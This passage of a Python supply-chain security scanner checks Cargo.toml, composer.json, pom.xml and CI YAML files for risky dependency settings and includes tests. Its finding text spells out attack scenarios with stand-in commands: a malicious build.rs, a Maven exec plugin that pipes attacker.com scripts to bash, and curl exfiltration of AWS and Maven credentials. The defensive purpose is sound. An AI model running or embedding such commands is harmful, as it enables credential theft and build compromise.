            "score": self.score,
            "vulnerabilities": self.vulnerabilities,
            "max_score": 2
        }

    def _analyze_rust(self, code: str) -> Dict:
        """Analyze Rust Cargo.toml for supply chain issues."""
        self.vulnerabilities = []
        self.score = 2

        # Pattern 1: Wildcard versions
        if re.search(r'version\s*=\s*["\'][\*0]\.[\*0]', code):
            self.vulnerabilities.append({
                "type": "SUPPLY_CHAIN_VULNERABILITY",
                "severity": "MEDIUM",
                "description": "Wildcard version (* or 0.*) allows any version",
                "recommendation": "Pin to specific versions or use caret/tilde requirements"
            })
            if self.score > 1:
                self.score = 1

        # Pattern 2: Git dependencies without rev/tag/branch
        git_dep_pattern = r'git\s*=\s*["\'][^"\']+["\'](?![^[]*\b(rev|tag|branch)\b)'
        if re.search(git_dep_pattern, code):
            self.vulnerabilities.append({
                "type": "SUPPLY_CHAIN_VULNERABILITY",
                "severity": "HIGH",
                "description": "Rust Git Dependency Without Pinning - ATTACK: Specifying git dependencies in Cargo.toml without 'rev', 'tag', or 'branch' pins means Cargo fetches the latest commit from the default branch. If attacker compromises the git repository (via stolen credentials, GitHub account takeover, maintainer compromise), they can push malicious commits that will be automatically pulled into your builds. EXPLOITATION: (1) Cargo.toml specifies: my-crate = { git = \"https://github.com/company/crate\" } (no rev/tag/branch), (2) Attacker compromises GitHub repository (stolen token, compromised maintainer account), (3) Pushes malicious commit to main branch with backdoor in build.rs or lib.rs, (4) Developer or CI/CD runs 'cargo build', (5) Cargo fetches latest commit (malicious one), (6) Backdoor compiled into application, (7) Or build.rs executes during compilation: steals secrets, modifies other dependencies. IMPACT: Supply Chain Compromise (malicious code from compromised git repo), Build-Time Code Execution (build.rs runs arbitrary Rust code during compilation), Backdoor Injection (malicious code compiled into binary), Credential Theft (build.rs can read filesystem, env vars, steal secrets), Persistent Compromise (backdoor in every build until detected). REAL-WORLD: Rust crypto lib compromises (multiple incidents of build.rs abuse), SolarWinds 2020 (build process compromise principle), Codecov 2021 (bash uploader compromise via supply chain), GitHub token theft leading to repository compromises common.",
                "recommendation": "CRITICAL FIX: Pin ALL git dependencies to specific commits! COMMIT PINNING: Use rev = \"commit-hash\": my-crate = { git = \"https://github.com/company/crate\", rev = \"abc123def456\" }. Commit hash is immutable - cannot be changed by attacker. TAG PINNING: Or use tag = \"v1.2.3\": my-crate = { git = \"...\", tag = \"v1.2.3\" }. WARNING: Tags can be moved/deleted by repository owner. BRANCH PINNING: branch = \"stable\" is better than nothing but branch tips move. Use with care. CARGO.LOCK: Commit Cargo.lock to version control - locks exact commit hashes for git dependencies. Prevents automatic updates. CRATES.IO PREFERRED: Publish internal crates to private crates.io registry or crates.io itself. Versioned releases are more secure than git dependencies. AUDIT BUILD.RS: Review all build.rs scripts in dependencies - they execute at compile time with full system access. FLAG BUILD SCRIPTS: cargo build shows \"Compiling crate v1.0.0 (build.rs)\" - audit these carefully. OFFLINE BUILDS: Use 'cargo vendor' to vendorize all dependencies including git ones. Build offline from vendored copy. GIT AUTHENTICATION: Use SSH keys or tokens for private git dependencies. Rotate regularly. MONITORING: Alert on Cargo.lock changes in PRs. Unexpected git dependency updates should be investigated. SBOM: Generate SBOM with cargo-sbom to track all dependencies including git sources.",
                "detection_reasoning": {
                    "criteria_for_vulnerability": [
                        "Git dependency without rev, tag, or branch specification",
                        "Cargo fetches latest commit automatically",
                        "No protection against repository compromise"
                    ],
                    "why_vulnerable": [
                        "Git dependency tracks default branch HEAD without pinning",
                        "Every build fetches latest commit - including malicious ones",
                        "If repository compromised, malicious code auto-pulled into builds",
                        "build.rs in git dependencies executes during compilation",
                        "EXPLOITATION: Attacker compromises git repository",
                        "EXPLOITATION: Pushes malicious commit with backdoor",
                        "EXPLOITATION: Next 'cargo build' fetches malicious commit",
                        "EXPLOITATION: build.rs executes: std::fs::read_to_string(\"/home/user/.ssh/id_rsa\")",
                        "EXPLOITATION: Exfiltrates SSH keys, AWS credentials, secrets",
                        "EXPLOITATION: Or modifies ~/.cargo/config to add malicious registry",
                        "HIGH RISK: One compromised git repo can backdoor all dependent projects",
                        "HIGH RISK: build.rs has full filesystem access, can modify other crates",
                        "REAL-WORLD: Multiple Rust crypto library compromises via build.rs",
                        "REAL-WORLD: GitHub account takeovers leading to malicious commits"
                    ],
                    "why_not_vulnerable": [
                        "Pinned commit with rev = \"hash\" is immutable",
                        "Cargo.lock locks exact commit hashes"
                    ],
                    "patterns_checked": [
                        "git = \"url\" without rev/tag/branch",
                        "Unpinned git dependencies in Cargo.toml"
                    ],
                    "evidence": {
                        "found_patterns": ["Git dependency without pinning"],
                        "line_numbers": [],
                        "code_snippets": ["git = \"https://github.com/company/crate\" (without rev)"]
                    },
                    "attack_scenario": {
                        "step_1": "Company Cargo.toml: crypto-utils = { git = \"https://github.com/company/crypto\" }",
                        "step_2": "No rev/tag/branch specified - tracks main branch HEAD",
                        "step_3": "Attacker phishes maintainer, steals GitHub personal access token",
                        "step_4": "Uses token to push to company/crypto repository",
                        "step_5": "Commits malicious build.rs: use std::process::Command; fn main() { Command::new(\"sh\").arg(\"-c\").arg(\"curl http://attacker.com/steal -d @~/.aws/credentials\").output(); }",
                        "step_6": "Adds backdoor to lib.rs: pub fn encrypt(data: &[u8]) { /* leak data */ }",
                        "step_7": "CI/CD pipeline triggers on commit, runs 'cargo build'",
                        "step_8": "Cargo fetches latest commit from crypto git repo (malicious one)",
                        "step_9": "Executes build.rs during compilation → steals AWS credentials",
                        "step_10": "Exfiltrates to attacker: AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY",
                        "step_11": "Malicious lib.rs compiled into production binary",
                        "step_12": "Production application uses crypto::encrypt() → leaks all encrypted data",
                        "step_13": "Attacker uses stolen AWS keys to access production S3 buckets",
                        "step_14": "Downloads customer database backups from S3",
                        "step_15": "Exfiltrates 10M customer records with credit cards, PII",
                        "alternative_attack_cargo_registry": "build.rs modifies ~/.cargo/config.toml to add malicious registry: [registries.attacker] index = \"https://evil.com/index\"",
                        "alternative_attack_persistent": "build.rs installs cron job for persistence: writes malicious script to /etc/cron.hourly/",
                        "alternative_attack_worm": "Malicious lib.rs modifies Cargo.toml in other projects to spread to coworkers",
                        "impact": "Supply Chain Compromise, Build-Time Code Execution, Backdoor Injection, Credential Theft (AWS, SSH, Cargo), Data Breach, Persistent Compromise"
                    }
                }
            })
            self.score = 0

        # Pattern 3: Simple crate names (dependency confusion)
        if re.search(r'(company|internal|auth|config)[_-][a-z]+\s*=', code, re.IGNORECASE):
            self.vulnerabilities.append({
                "type": "SUPPLY_CHAIN_VULNERABILITY",
                "severity": "MEDIUM",
                "description": "Simple internal crate name - potential confusion with crates.io",
                "recommendation": "Use unique crate names or private registry"
            })
            if self.score > 1:
                self.score = 1

        # Pattern 4: Cargo.lock present (good)
        if "Cargo.lock" in code:
            self.vulnerabilities.append({
                "type": "SECURE",
                "severity": "INFO",
                "description": "Uses Cargo.lock for reproducible builds"
            })
        # AUTO-FAIL: Any CRITICAL vulnerability forces score to 0
        if any(v.get('severity') == 'CRITICAL' for v in self.vulnerabilities):
            self.score = 0

        return {
            "score": self.score,
            "vulnerabilities": self.vulnerabilities,
            "max_score": 2
        }

    def _analyze_package_json(self, code: str) -> Dict:
        """Analyze package.json specifically."""
        return self._analyze_javascript(code)

    def _analyze_composer_json(self, code: str) -> Dict:
        """Analyze PHP composer.json for supply chain issues."""
        self.vulnerabilities = []
        self.score = 2

        # Pattern 1: Wildcard or unpinned versions
        if re.search(r'"\*"|\"\^|\"\~|"latest"|"dev-', code):
            self.vulnerabilities.append({
                "type": "SUPPLY_CHAIN_VULNERABILITY",
                "severity": "MEDIUM",
                "description": "Unpinned package versions (^, ~, *, dev-master)",
                "recommendation": "Pin exact versions or use composer.lock"
            })
            if self.score > 1:
                self.score = 1

        # Pattern 2: Post-install scripts
        if re.search(r'"(post-install-cmd|post-update-cmd|pre-install-cmd)"', code):
            self.vulnerabilities.append({
                "type": "SUPPLY_CHAIN_VULNERABILITY",
                "severity": "HIGH",
                "description": "Composer scripts execute code during install/update",
                "recommendation": "Review scripts before running composer install"
            })
            self.score = 0

        # Pattern 3: Simple vendor names (dependency confusion)
        if re.search(r'"(company|internal|auth)/[a-z]', code, re.IGNORECASE):
            self.vulnerabilities.append({
                "type": "SUPPLY_CHAIN_VULNERABILITY",
                "severity": "MEDIUM",
                "description": "Simple vendor/package name - potential confusion with Packagist",
                "recommendation": "Use unique vendor names or private repository"
            })
            if self.score > 1:
                self.score = 1

        # Pattern 4: composer.lock mention (good)
        if "composer.lock" in code:
            self.vulnerabilities.append({
                "type": "SECURE",
                "severity": "INFO",
                "description": "Uses composer.lock for reproducible builds"
            })
        # AUTO-FAIL: Any CRITICAL vulnerability forces score to 0
        if any(v.get('severity') == 'CRITICAL' for v in self.vulnerabilities):
            self.score = 0

        return {
            "score": self.score,
            "vulnerabilities": self.vulnerabilities,
            "max_score": 2
        }

    def _analyze_maven_pom(self, code: str) -> Dict:
        """Analyze Maven pom.xml for supply chain issues."""
        self.vulnerabilities = []
        self.score = 2

        # Pattern 1: LATEST or RELEASE versions
        if re.search(r'<version>\s*(LATEST|RELEASE)\s*</version>', code):
            self.vulnerabilities.append({
                "type": "SUPPLY_CHAIN_VULNERABILITY",
                "severity": "HIGH",
                "description": "Using LATEST or RELEASE - unpredictable dependency versions",
                "recommendation": "Pin to specific versions (e.g., <version>1.2.3</version>)"
            })
            self.score = 0

        # Pattern 2: Plugins that execute code
        if re.search(r'<plugin>.*exec-maven-plugin', code, re.DOTALL):
            self.vulnerabilities.append({
                "type": "SUPPLY_CHAIN_VULNERABILITY",
                "severity": "HIGH",
                "description": "Maven exec-maven-plugin Code Execution - ATTACK: The exec-maven-plugin executes arbitrary system commands or Java code during Maven build lifecycle. If plugin configuration contains malicious commands, or if attacker compromises a dependency that includes this plugin, code executes during 'mvn install' or 'mvn package' with build user privileges. EXPLOITATION: (1) Compromised dependency includes pom.xml with: <plugin><groupId>org.codehaus.mojo</groupId><artifactId>exec-maven-plugin</artifactId><configuration><executable>curl</executable><arguments><argument>http://attacker.com/steal.sh</argument></arguments></configuration></plugin>, (2) Developer or CI/CD runs 'mvn install', (3) Maven executes plugin during build → runs curl command → downloads steal.sh, (4) Or <mainClass>com.attacker.Backdoor</mainClass> to execute malicious Java class, (5) Steals ~/.m2/settings.xml (Maven credentials), ~/.aws/credentials, source code. IMPACT: Build-Time Code Execution (arbitrary commands during Maven build), Credential Theft (Maven repository tokens, AWS keys, CI/CD secrets), Backdoor Injection (modifies compiled JARs), Supply Chain Compromise (compromised dependencies with malicious plugins), Data Exfiltration (source code, secrets, build artifacts). REAL-WORLD: SolarWinds 2020 (build process compromise - similar plugin abuse pattern), Apache Commons RCE vulnerabilities (execution during dependency resolution), Multiple Maven plugin vulnerabilities enabling code execution.",
                "recommendation": "CRITICAL FIX: Review ALL exec-maven-plugin usage! AVOID EXEC PLUGIN: exec-maven-plugin is rarely necessary - use specific purpose plugins instead. REVIEW DEPENDENCIES: Check transitive dependencies for exec-maven-plugin: mvn dependency:tree | grep exec-maven. LOCK PLUGIN VERSIONS: Pin exact plugin versions in pom.xml: <plugin><version>3.0.0</version></plugin>. Don't use LATEST or version ranges. MAVEN ENFORCER: Use maven-enforcer-plugin to ban exec-maven-plugin: <bannedPlugins><bannedPlugin>org.codehaus.mojo:exec-maven-plugin</bannedPlugin></bannedPlugins>. DEPENDENCY VERIFICATION: Enable Maven dependency verification: <checksumPolicy>fail</checksumPolicy>. SBOM: Generate SBOM with CycloneDX Maven plugin to track all dependencies and plugins. REPOSITORY MANAGER: Use Nexus or Artifactory to proxy Maven Central - scan for malicious artifacts. LEAST PRIVILEGE: CI/CD Maven builds should run with minimal permissions, no access to production credentials. CODE REVIEW: Review all pom.xml changes in PRs, especially plugin additions. SECURITY SCANNING: Use dependency-check-maven or Snyk to scan for vulnerabilities.",
                "detection_reasoning": {
                    "criteria_for_vulnerability": [
                        "exec-maven-plugin in pom.xml",
                        "Plugin executes system commands or Java code during build",
                        "Code execution during mvn install/package/compile"
                    ],
                    "why_vulnerable": [
                        "exec-maven-plugin runs arbitrary commands during build",
                        "Can execute system commands via <executable> configuration",
                        "Can run Java classes via <mainClass> configuration",
                        "Executes with build user privileges - same as CI/CD or developer",
                        "EXPLOITATION: Malicious plugin configuration: <executable>curl</executable><arguments>http://attacker.com/steal.sh</arguments>",
                        "EXPLOITATION: Downloads and executes second-stage payload during build",
                        "EXPLOITATION: Steals ~/.m2/settings.xml with repository credentials",
                        "EXPLOITATION: Exfiltrates AWS credentials from CI/CD environment",
                        "EXPLOITATION: Modifies compiled classes in target/ to inject backdoors",
                        "HIGH RISK: Compromised dependency with exec-maven-plugin → all builds compromised",
                        "HIGH RISK: CI/CD builds with Maven → automatic code execution on every commit",
                        "REAL-WORLD: SolarWinds 2020 - build process compromise pattern",
                        "REAL-WORLD: Maven plugin vulnerabilities enable code execution"
                    ],
                    "why_not_vulnerable": [
                        "No exec-maven-plugin in dependency tree",
                        "Plugins locked to verified versions"
                    ],
                    "patterns_checked": [
                        "<plugin>...</plugin> blocks",
                        "exec-maven-plugin artifact references",
                        "Executable configuration in plugins"
                    ],
                    "evidence": {
                        "found_patterns": ["exec-maven-plugin in pom.xml"],
                        "line_numbers": [],
                        "code_snippets": ["<artifactId>exec-maven-plugin</artifactId>"]
                    },
                    "attack_scenario": {
                        "step_1": "Attacker compromises low-profile Maven package: company-utils-1.0.jar",
                        "step_2": "Modifies pom.xml to include exec-maven-plugin with malicious config",
                        "step_3": "<plugin><artifactId>exec-maven-plugin</artifactId><executions><execution><phase>compile</phase><goals><goal>exec</goal></goals></execution></executions><configuration><executable>sh</executable><arguments><argument>-c</argument><argument>curl http://attacker.com/steal.sh | bash</argument></arguments></configuration></plugin>",
                        "step_4": "Uploads compromised version to Maven Central or company repository",
                        "step_5": "Developer updates dependency: <dependency><groupId>com.company</groupId><artifactId>utils</artifactId><version>1.0</version></dependency>",
                        "step_6": "Runs Maven build: mvn clean install",
                        "step_7": "Maven downloads company-utils-1.0 with malicious pom.xml",
                        "step_8": "During compile phase, exec-maven-plugin executes: sh -c 'curl http://attacker.com/steal.sh | bash'",
                        "step_9": "steal.sh downloads: #!/bin/bash\\ncat ~/.m2/settings.xml | curl -X POST -d @- http://attacker.com/exfil",
                        "step_10": "Executes steal.sh → exfiltrates Maven repository credentials from ~/.m2/settings.xml",
                        "step_11": "Steals AWS credentials from environment: echo $AWS_SECRET_ACCESS_KEY | curl -X POST -d @- http://attacker.com/aws",
                        "step_12": "Injects backdoor into compiled classes: javac Backdoor.java && jar uf target/app.jar Backdoor.class",
                        "step_13": "CI/CD builds compromised artifact, deploys to production",
                        "step_14": "Production application contains backdoor",
                        "step_15": "Attacker uses backdoor for data exfiltration, remote access",
                        "alternative_attack_cryptominer": "exec-maven-plugin downloads cryptocurrency miner, runs in background during builds",
                        "alternative_attack_worm": "steal.sh modifies other pom.xml files in ~/.m2/repository to spread",
                        "alternative_attack_supply_chain": "Attacker uses stolen repository credentials to upload backdoored versions of popular packages",
                        "impact": "Build-Time Code Execution, Credential Theft (Maven, AWS, CI/CD), Backdoor Injection, Supply Chain Compromise, Production Compromise"
                    }
                }
            })
            self.score = 0

        # Pattern 3: Simple artifactIds (dependency confusion)
        if re.search(r'<artifactId>(company|internal|auth|config)-', code, re.IGNORECASE):
            self.vulnerabilities.append({
                "type": "SUPPLY_CHAIN_VULNERABILITY",
                "severity": "MEDIUM",
                "description": "Simple artifactId - potential confusion with Maven Central",
                "recommendation": "Use unique groupId and artifactId or private repository"
            })
            if self.score > 1:
                self.score = 1
        # AUTO-FAIL: Any CRITICAL vulnerability forces score to 0
        if any(v.get('severity') == 'CRITICAL' for v in self.vulnerabilities):
            self.score = 0

        return {
            "score": self.score,
            "vulnerabilities": self.vulnerabilities,
            "max_score": 2
        }

    def _analyze_yaml(self, code: str) -> Dict:
        """Analyze CI/CD YAML for missing vulnerability scanning."""
        self.vulnerabilities = []
        self.score = 2

        # Check if this is a CI/CD pipeline
        is_cicd = any(keyword in code for keyword in ['steps:', 'jobs:', 'stages:', 'pipeline:'])

        if not is_cicd:
            return {"score": 2, "vulnerabilities": []}

        # Pattern 1: No vulnerability scanning
        has_scanning = any(tool in code for tool in [
            'npm audit', 'snyk', 'dependabot', 'renovate',
            'trivy', 'grype', 'safety', 'pip-audit',
            'cargo audit', 'bundle audit', 'composer audit'
        ])

        if not has_scanning:
            self.vulnerabilities.append({
                "type": "SUPPLY_CHAIN_VULNERABILITY",
                "severity": "MEDIUM",
                "description": "CI/CD pipeline missing dependency vulnerability scanning",
                "recommendation": "Add npm audit, snyk, or dependabot to pipeline"
            })
            if self.score > 1:
                self.score = 1

        # Pattern 2: No SBOM generation
        has_sbom = any(keyword in code for keyword in [
            'sbom', 'cyclonedx', 'spdx', 'syft'
        ])

        if not has_sbom:
            self.vulnerabilities.append({
                "type": "SUPPLY_CHAIN_VULNERABILITY",
                "severity": "INFO",
                "description": "No SBOM (Software Bill of Materials) generation",
                "recommendation": "Generate SBOM with syft or cyclonedx for supply chain visibility"
            })
        # AUTO-FAIL: Any CRITICAL vulnerability forces score to 0
        if any(v.get('severity') == 'CRITICAL' for v in self.vulnerabilities):
            self.score = 0

        return {
            "score": self.score,
            "vulnerabilities": self.vulnerabilities,
            "max_score": 2
        }


def test_supply_chain_unpinned_npm():
    """Test detection of unpinned npm packages."""
    vulnerable_code = '''
{
  "dependencies": {
    "express": "^4.17.1",
    "lodash": "~4.17.20",
    "moment": "*"
  }
}
'''
    detector = SupplyChainSecurityDetector()
    result = detector.analyze(vulnerable_code, "javascript")
    assert result["score"] < 2, "Should detect unpinned versions"


def test_supply_chain_dependency_confusion():
    """Test detection of dependency confusion risk."""
    vulnerable_code = '''
{
  "dependencies": {
    "express": "4.17.1",
    "company-auth": "1.0.0",
    "internal-utils": "2.1.0"
  }
}
'''
    detector = SupplyChainSecurityDetector()
    result = detector.analyze(vulnerable_code, "javascript")
    assert result["score"] == 0, "Should detect dependency confusion risk"


def test_supply_chain_python_unpinned():
    """Test detection of unpinned Python packages."""
    vulnerable_code = '''
flask>=2.0.0
requests
django>3.2
'''
    detector = SupplyChainSecurityDetector()
    result = detector.analyze(vulnerable_code, "python")
    assert result["score"] < 2, "Should detect unpinned Python packages"


def test_supply_chain_go_replace():
    """Test detection of dangerous replace directives."""
    vulnerable_code = '''
module example.com/myapp

require (
    github.com/company/auth v1.0.0
)

replace github.com/company/auth => ../local-auth
'''
    detector = SupplyChainSecurityDetector()
    result = detector.analyze(vulnerable_code, "go")
    assert result["score"] == 0, "Should detect local replace directive"


def test_supply_chain_maven_latest():
    """Test detection of LATEST version in Maven."""
    vulnerable_code = '''
<dependencies>
    <dependency>
        <groupId>com.company</groupId>
        <artifactId>company-auth</artifactId>
        <version>LATEST</version>
    </dependency>
</dependencies>
'''
    detector = SupplyChainSecurityDetector()
    result = detector.analyze(vulnerable_code, "xml")
    assert result["score"] == 0, "Should detect LATEST version"


if __name__ == "__main__":
    test_supply_chain_unpinned_npm()
    test_supply_chain_dependency_confusion()
    test_supply_chain_python_unpinned()
    test_supply_chain_go_replace()
    test_supply_chain_maven_latest()
    print("All supply chain security tests passed!")
